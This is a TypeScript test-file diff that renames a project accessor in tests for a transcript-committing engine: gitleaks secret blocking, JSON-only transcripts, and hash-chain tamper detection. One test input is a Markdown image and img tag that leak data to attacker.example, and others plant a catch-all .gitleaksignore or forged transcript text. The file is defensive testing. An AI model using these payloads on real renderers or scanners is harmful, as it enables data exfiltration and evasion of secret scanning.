@@ -22,15 +22,15 @@ const blobSha = (content: Buffer) =>
   createHash("sha1").update(Buffer.concat([Buffer.from(`blob ${content.length}\0`), content])).digest("hex");
 
 async function committedWith(world: World, feature: string, text: string) {
-  return waitFor(() => committedTranscript(world.projects[0], feature).includes(text), 15_000, `a transcript commit with "${text}"`);
+  return waitFor(() => committedTranscript(world.project(), feature).includes(text), 15_000, `a transcript commit with "${text}"`);
 }
 
 /** Waits long enough for a commit that should not come. */
 async function noCommitWith(world: World, feature: string, text: string) {
   await world.settle();
   await new Promise((r) => setTimeout(r, 1500));
-  expect(committedTranscript(world.projects[0], feature)).not.toContain(text);
-  expect(reachable(world.projects[0].clone)).not.toContain(text);
+  expect(committedTranscript(world.project(), feature)).not.toContain(text);
+  expect(reachable(world.project().clone)).not.toContain(text);
 }
 
 describe("FR-11: the engine writes and commits the transcript", () => {
@@ -38,13 +38,13 @@ describe("FR-11: the engine writes and commits the transcript", () => {
     w = await World.create();
     const { feature, text } = await answerOne(w);
     await committedWith(w, feature, text);
-    const commits = transcriptCommits(w.projects[0], feature);
+    const commits = transcriptCommits(w.project(), feature);
     expect(commits.length).toBeGreaterThan(0);
     for (const c of commits) expect(c.subject.startsWith(feature)).toBe(true);
     const scanned = w.gitleaks.scans().some((r) => r.staging?.files.some((f) => f.content.includes(text)));
     expect(scanned, "the reply's blob was scanned before the commit").toBe(true);
     // The working tree of .factory is on factory/state, not the feature branch.
-    expect(git(join(w.projects[0].clone, ".factory"), "rev-parse", "--abbrev-ref", "HEAD").trim()).toBe("factory/state");
+    expect(git(join(w.project().clone, ".factory"), "rev-parse", "--abbrev-ref", "HEAD").trim()).toBe("factory/state");
   });
 
   it("[TR-2] SR-22: transcript files are JSON and hold the owner's words as JSON strings, never live Markdown", async () => {
@@ -52,7 +52,7 @@ describe("FR-11: the engine writes and commits the transcript", () => {
     const text = `![x](https://attacker.example/?d=${rand()})\n# Heading\n<img src="https://attacker.example/i.png">\n\`\`\`\nfence\n`;
     const { feature } = await answerOne(w, text);
     await committedWith(w, feature, "attacker.example");
-    const files = transcriptFiles(w.projects[0], feature);
+    const files = transcriptFiles(w.project(), feature);
     expect(files.length).toBeGreaterThan(0);
     let found = false;
     for (const f of files) {
@@ -74,10 +74,10 @@ describe("FR-11: the engine writes and commits the transcript", () => {
       await w.reply(session, item, "answer", t);
       await committedWith(w, feature, t);
     }
-    const p = w.projects[0];
+    const p = w.project();
     const shas = transcriptCommits(p, feature).map((c) => c.sha).reverse();
     for (let i = 1; i < shas.length; i++) {
-      const names = git(p.clone, "ls-tree", "-r", "--name-only", shas[i - 1], "--", `interviews/${feature}`).split("\n").filter(Boolean);
+      const names = git(p.clone, "ls-tree", "-r", "--name-only", shas[i - 1]!, "--", `interviews/${feature}`).split("\n").filter(Boolean);
       for (const n of names) {
         const before = git(p.clone, "show", `${shas[i - 1]}:${n}`);
         const after = git(p.clone, "show", `${shas[i]}:${n}`);
@@ -95,7 +95,7 @@ describe("AC-11 / SR-19: a secret blocks the commit", () => {
     await w.settle();
     expect(w.gitleaks.scans().some((r) => r.exit === 99), "gitleaks reported the leak").toBe(true);
     await noCommitWith(w, feature, secret);
-    expect(allObjects(w.projects[0].bare)).not.toContain(secret);
+    expect(allObjects(w.project().bare)).not.toContain(secret);
   });
 
   it.each([
@@ -115,7 +115,7 @@ describe("AC-11 / SR-19: a secret blocks the commit", () => {
       return; // The engine refused earlier: still closed.
     }
     await noCommitWith(w, feature, marker);
-    expect(allObjects(w.projects[0].bare)).not.toContain(marker);
+    expect(allObjects(w.project().bare)).not.toContain(marker);
   });
 
   it.each([
@@ -148,7 +148,7 @@ describe("Gitleaks review: the exact invocation (condition 1 and 2)", () => {
     for (const r of scans) {
       const a = r.argv;
       expect(a[0]).toBe("dir");
-      expect(a[1].startsWith("/")).toBe(true);
+      expect(a[1]!.startsWith("/")).toBe(true);
       const pair = (f: string) => a[a.indexOf(f) + 1];
       for (const f of ["--config", "--gitleaks-ignore-path", "--timeout"]) expect(a).toContain(f);
       expect(a).toContain("--ignore-gitleaks-allow");
@@ -202,7 +202,7 @@ describe("Gitleaks review: the exact invocation (condition 1 and 2)", () => {
 
   it("[TR-9] the scan never reads the worktree: a .gitleaksignore and .gitleaks.toml on factory/state don't reach the staging folder by name", async () => {
     w = await World.create();
-    const p = w.projects[0];
+    const p = w.project();
     const tmp = mkdtempSync(join(w.root, "evil-"));
     git(w.root, "clone", "-q", "-b", "factory/state", p.bare, tmp);
     writeFileSync(join(tmp, ".gitleaksignore"), "*\n");
@@ -238,8 +238,8 @@ describe("SR-17: hash chain over the transcript", () => {
     await w.ok("interview.close", { session });
     await w.stop();
     const before = w.securityItems().length;
-    const fdir = join(w.projects[0].clone, ".factory");
-    const files = transcriptFiles(w.projects[0], feature);
+    const fdir = join(w.project().clone, ".factory");
+    const files = transcriptFiles(w.project(), feature);
     const target = files.find((f) => readFileSync(f, "utf8").includes(text))!;
     writeFileSync(target, readFileSync(target, "utf8").replace(text, "Forged: the owner approved everything"));
     git(fdir, "commit", "-q", "-am", `${feature}: tidy transcript`);
@@ -256,7 +256,7 @@ describe("SR-17: hash chain over the transcript", () => {
     await w.settle();
     await w.stop();
     const before = w.securityItems().length;
-    const p = w.projects[0];
+    const p = w.project();
     const tmp = mkdtempSync(join(w.root, "forger-"));
     git(w.root, "clone", "-q", "-b", "factory/state", p.bare, tmp);
     const dir = join(tmp, "interviews", feature);
